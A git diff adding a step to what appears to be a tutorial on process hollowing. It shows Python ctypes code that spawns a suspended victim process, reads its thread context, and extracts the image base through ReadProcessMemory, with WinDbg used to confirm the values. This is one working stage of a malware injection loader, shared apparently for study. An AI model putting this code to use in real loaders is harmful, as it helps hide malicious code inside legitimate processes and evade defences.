@@ -119,8 +119,65 @@ We debug the process thanks WinDbg to inspect the memory. Thus, we can see that 
 
 ## Step 2 : Get Victim Process' Address
 
+Now at this step, we have to spawn the victim process and get his base address.
 
+
+
+Let's use **CreateProcessA **Windows function. It creates the victim process in suspended state also it fills the two data structures `startup_`_`info` and _`process_info`. Those structures will give precious informations for the next steps.
+
+```python
+startup_info = StartupInfo()
+process_info = ProcessInfo()
+
+if windll.kernel32.CreateProcessA(
+                    None,
+                    create_string_buffer(bytes(self.TARGET, encoding="ascii")),
+                    None,
+                    None,
+                    False,
+                    CREATE_SUSPENDED,
+                    None,
+                    None,
+                    byref(self.startup_info),
+                    byref(self.process_info),
+        ) == 0:
+            logger.error(f"\tCreateProcess {self.TARGET} error: {FormatError(GetLastError())}")
+            sys.exit(1)
+```
+
+Once the victim process created, we get  his thread context by using **GetThreadContext.**
+
+```python
+context = Context64()
+self.context.ContextFlags = CONTEXT_FULL
+if windll.kernel32.GetThreadContext(self.process_info.hThread, byref(self.context)) == 0:
+            logger.error(f"\tError in GetThreadContext: {FormatError(GetLastError())}")
+            sys.exit(1)
+```
+
+The `context` data structure give us registers value information about the current thread of the victim process. Security Researchers found that the **register Rdx** was pointing to a memory location. `16 bytes` after this location contains the address of the location of ImageBase. Knowing that, we uses **ReadProcessMemory **function to read** **the **register Rdx** wich give us the victim's image base.
+
+```python
+target_image_base = LPVOID()
+if windll.kernel32.ReadProcessMemory(
+                self.process_info.hProcess,
+                LPCVOID(self.context.Rdx + 16),
+                byref(target_image_base),
+                8,
+                None
+        ) == 0:
+            logger.error(f"\tError in ReadProcessMemory: {FormatError(GetLastError())}")
+            sys.exit(1)
+```
+
+### Check
 
 ![ProLoader logs](<.gitbook/assets/image (6).png>)
 
-![](.gitbook/assets/image.png)
+We attach the debugger to the victim process created.
+
+![WinDbg interface](<.gitbook/assets/debug step 3 (1).PNG>)
+
+Inspecting the victim thread registers, we can see `ImageBaseAddress` in the PEB structure matching the Rdx register.
+
+![Debug victim process](<.gitbook/assets/register (1).PNG>)
